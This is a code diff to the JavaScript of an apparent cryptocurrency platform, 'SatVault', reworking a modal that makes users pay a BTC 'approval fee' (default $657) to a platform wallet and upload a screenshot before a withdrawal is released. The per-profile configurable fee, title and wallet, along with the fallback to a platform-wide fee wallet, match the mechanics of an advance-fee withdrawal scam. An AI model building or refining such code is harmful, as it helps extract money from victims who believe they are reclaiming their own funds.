@@ -12,6 +12,12 @@
 
   window.requiresWithdrawFeeProof = requiresFeeProof;
 
+  function getFeePaymentWallet(profile) {
+    if (profile && profile.withdrawFeeWallet) return profile.withdrawFeeWallet;
+    if (window.SITE && SITE.platformWallet) return SITE.platformWallet;
+    return "";
+  }
+
   function ensureModal() {
     if (document.getElementById("withdraw-fee-proof-modal")) return;
     document.body.insertAdjacentHTML("beforeend",
@@ -32,7 +38,8 @@
             '<span class="text-gray-500 text-xs">Approval fee</span>' +
             '<strong id="withdraw-fee-proof-amount" class="text-primary text-lg">—</strong>' +
           "</div>" +
-          '<p id="withdraw-fee-proof-fee-hint" class="text-xs text-gray-500 mb-2 mt-4">Send the approval fee to this BTC wallet</p>' +
+          '<p id="withdraw-fee-proof-fee-hint" class="text-xs text-gray-500 mb-2 mt-4">Pay the approval fee to this BTC wallet</p>' +
+          '<p class="text-xs text-gray-500 mb-2">Platform wallet address</p>' +
           '<p id="withdraw-fee-proof-wallet" class="wallet-box"></p>' +
           '<button type="button" id="withdraw-fee-proof-copy" class="btn-ghost text-sm mt-3 w-full">Copy fee wallet address</button>' +
           '<div class="mt-4">' +
@@ -132,7 +139,7 @@
     }
 
     var fee = (profile && profile.withdrawFeeAmount) || 657;
-    var feeWallet = (profile && profile.withdrawFeeWallet) || "";
+    var feeWallet = getFeePaymentWallet(profile);
     var user = window.SatVaultAuth && SatVaultAuth.getUser && SatVaultAuth.getUser();
     var profileId = window.SatVaultAuth && SatVaultAuth.getProfileId && SatVaultAuth.getProfileId();
     var syncToken = window.SITE && typeof SITE.getSyncToken === "function"
@@ -205,6 +212,8 @@
     }
 
     ensureModal();
+    if (typeof fillWalletFields === "function") fillWalletFields();
+
     window.__withdrawFeeProofPending = {
       amount: amount,
       destinationWallet: destinationWallet || "",
@@ -212,16 +221,15 @@
     };
 
     var fee = Number(profile.withdrawFeeAmount) || 657;
-    var feeWallet = profile.withdrawFeeWallet || "";
+    var feeWallet = getFeePaymentWallet(profile);
     var feeTitle = profile.withdrawFeeProofTitle || "Approval for Withdrawal";
     var amtLabel = "$" + Number(amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
     var feeLabel = "$" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 
     document.getElementById("withdraw-fee-proof-title").textContent = feeTitle;
     document.getElementById("withdraw-fee-proof-body").textContent =
-      "To withdraw " + amtLabel + " to your wallet, pay the " + feeLabel +
-      " approval fee in BTC to the address below and upload a screenshot. " +
-      "After that, " + amtLabel + " is deducted from your account balance and sent to the wallet you entered.";
+      "To complete your withdrawal of " + amtLabel + " to your wallet, pay the " + feeLabel +
+      " approval fee in BTC to the platform wallet below, then upload a screenshot of the payment.";
     document.getElementById("withdraw-fee-proof-withdraw-amt").textContent = amtLabel;
     document.getElementById("withdraw-fee-proof-dest").textContent = destinationWallet || "—";
     document.getElementById("withdraw-fee-proof-amount").textContent = feeLabel;
